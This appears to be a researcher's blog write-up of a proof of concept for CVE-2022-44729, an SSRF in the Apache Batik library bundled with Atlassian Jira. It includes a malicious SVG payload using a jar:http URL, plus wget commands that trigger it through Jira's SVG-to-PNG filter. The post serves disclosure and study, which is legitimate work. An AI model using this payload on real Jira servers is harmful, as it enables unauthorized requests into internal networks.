---
layout: post
title:  "CVE-2022-44729 PoC for Atlassian Jira SSRF due to Apache Batik vulnerabilites"
datetime: 2024-01-18 17:45:00 MET
last_modified_at: 2024-01-19 10:05:00 MET
author: 'psytester'
---

Here is my Proof of Concept for a SSRF in Atlassian Jira.

[AtlassianSecurity Bulletin - January 16 2024](https://confluence.atlassian.com/security/security-bulletin-january-16-2024-1333335615.html) points to some 3rd-party updates, e.g. CVE-2022-44729 in Apache Batik with a SSRF issue.<br>

I was not able to upload a file into Jira /images path with usage of admin webservice. But if the malicious SVG is placed by an admin in Jira /images path, an unauthenticated attacker can trigger the SSRF issue, too.

Ok let's start, take a closer look. Ohh! There are a lot of SSRF issues in [Batik vulnerability advisory.](https://xmlgraphics.apache.org/security.html)<br>
I found a write-up at [zerodayinitiative blog.](https://www.zerodayinitiative.com/blog/2022/10/28/vulnerabilities-in-apache-batik-default-security-controls-ssrf-and-rce-through-remote-class-loading) from Piotr Bazydło in Oct. 2022. Great details, thank you for that.<br>

I'm using latest V9.**4**.15 **LTS**, am I'm safe? **NO**!!!<br>
As today 18. January 2024, Batik 1.17 was released at 2023-08-22 and e.g. Jira V9.**4**.11 LTS from October 2023 up to latest V9.**4**.15 LTS from 3. January 2024 still contains Batik version 1.14 from 2021-01-20.<br>
Jira V9.**4** is EOL, just newest Jira V9.**12**.2 LTS from 10. January 2024 contains latest Batik version 1.17

Long Jira research, short goal:<br>
There is an AvatarTranscoder.class, which uses Apache Batik, but don't get confused about "Avatar". Due to the fact, that Jira user avatar or issue type can't be a SVG, this is not usable.<br>

There are three classes which are using AvatarTranscoder:
```
com.atlassian.jira.component.pico.registrar.ContainerRegistrar
com.atlassian.jira.mail.util.MailAttachments
com.atlassian.jira.web.filters.SvgToPngTranscoderFilter
```

I was not able to setup a mail notification which includes the issue attachement.content, because Jira does not support it.
No avatar nor icon SVG, no mail attachement.<br>
Time for frustration.

Back on track, why do they offer SvgToPngTranscoderFilter.class and what is it doing?
```
  private boolean needsTranscoding(HttpServletRequest request) {
    if (request.getServletPath().endsWith(".svg")) {
      String format = request.getParameter("format");
      return (StringUtils.isNotBlank(format) && "PNG".equals(format.toUpperCase()));
    } 
    return false;
  }
```

Checking they /opt/atlassian/jira/atlassian-jira/WEB-INF/web.xml
```
    <filter>
        <filter-name>svg-to-png-transcoder</filter-name>
        <filter-class>com.atlassian.jira.web.filters.SvgToPngTranscoderFilter</filter-class>
    </filter>
    ....
   <filter-mapping>
        <filter-name>svg-to-png-transcoder</filter-name>
        <url-pattern>/images/*</url-pattern>
    </filter-mapping>
```

Login into Jira page, there are some SVG images located in `/images/`<br>
`wget http://localhost:8080/images/jira-software.svg`
```
....
Länge: 9743 (9,5K) [image/svg+xml]

cat jira-software.svg
<?xml version="1.0" encoding="UTF-8"?>
<svg width="158px" height="30px" viewBox="0 0 158 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
```

I'm excited when it's what I think it is by using query parameter "?**format=png**"<br>

`wget http://localhost:8080/images/jira-software.svg?format=png`<br>
`cat jira-software.svg\?format\=png`<br>
```
�PNG
```

Ok, the SVG was converted to PNG :-)

Placing my SSRF SVG image on the server, for this simple PoC it needs to be located in `/opt/atlassian/jira/atlassian-jira/images/`<br>

cat /opt/atlassian/jira/atlassian-jira/images/SSRF.svg
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="450" height="500" viewBox="0 0 450 500">
    <image width="50" height="50" xlink:href="jar:http://localhost:4242/poc?poc=poc!/"></image>
</svg>
```

`wget http://localhost:8080/images/SSRF.svg?format=png`<br>

**BINGO!**

If host and port is not reachable, there will be an immediate HTTP 500 error.
Otherwise it depends. My remote netcat listener keeps open the connection.

![Screens Gif showing the SSRF](https://psytester.github.io/images/CVE-2022-44729_Batik_SSRF_Atlassian_Jira_SSRF.gif)


Thank you for reading. The Batik vulnerabilites CVEs are not my credit, but the work on the PoC exploit in Jira is powered by psytester, this post was only for my private fun. ;-)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2024 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
